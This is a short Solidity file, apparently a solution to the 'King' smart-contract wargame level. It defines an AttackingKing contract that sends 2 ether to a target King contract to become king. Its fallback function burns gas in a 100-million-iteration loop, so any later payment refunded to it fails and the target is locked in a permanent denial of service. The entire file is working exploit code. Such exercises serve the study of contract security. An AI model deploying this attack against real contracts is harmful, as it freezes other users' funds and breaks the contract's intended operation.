// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    fallback() external payable {
        for (uint256 i = 0; i < 100000000; i++) {}
    }

    function hackContract() external {
        // King victim = King(contractAddress);
        payable(address(contractAddress)).call{value: 2 ether}("");
    }
}
